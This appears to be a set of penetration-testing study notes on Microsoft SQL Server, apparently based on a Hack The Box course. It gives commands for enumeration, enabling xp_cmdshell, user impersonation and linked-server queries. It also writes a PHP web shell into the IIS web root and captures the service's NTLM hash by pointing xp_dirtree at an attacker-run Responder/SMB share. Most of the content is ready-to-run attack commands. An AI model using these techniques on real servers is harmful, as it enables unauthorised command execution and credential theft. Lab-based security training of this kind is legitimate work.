
### Nmap
```
EmaadAbbasi@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

### Metasploit

```
auxiliary(scanner/mssql/mssql_ping
```

### Interaction

| **Command**                                     | **Description**                                          |
| ----------------------------------------------- | -------------------------------------------------------- |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |

![](https://academy.hackthebox.com/storage/modules/112/ssms.png)
Many other clients can be used to access a database running on MSSQL. Including but not limited to:

- mssql-cli
- SQL Server Powershell
- HeidiSQL
- SQLPro
- Impacket's mssqlclient.py

```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

Orbixio@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`.

| Default System Database | Description                                                                                                                                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `master`                | Tracks all system information for an SQL server instance                                                                                                                                               |
| `model`                 | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`                  | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`                | Stores temporary objects                                                                                                                                                                               |
| `resource`              | Read-only database containing system objects included with SQL server                                                                                                                                  |

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |


```cmd-session
SELECT name FROM master.dbo.sysdatabases

USE htbusers

SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES

SELECT * FROM users
```

### Execute Commands### 

```cmd-session
1> xp_cmdshell 'whoami'
```

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

### Read and Write files### 
**Enable Ole Automation Procedures**
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
**Create file**
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
**Read file**
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### Capture MSSQL Service Hash### 

To make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) 

```shell-session
Orbixio@htb[/htb]$ sudo responder -I tun0

Orbixio@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
```
Execute one of the following SQL queries:

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'

1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

### Impersonate Existing Users with MSSQL### 

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
**Viewing Current User and Role**
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

As the returned value `0` indicates, we do not have the sysadmin role

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.


### Communicate with Other Databases with MSSQL### 

```cmd-session
1> SELECT srvname, isremote FROM sysservers
```
```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

```powershell-session
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain
```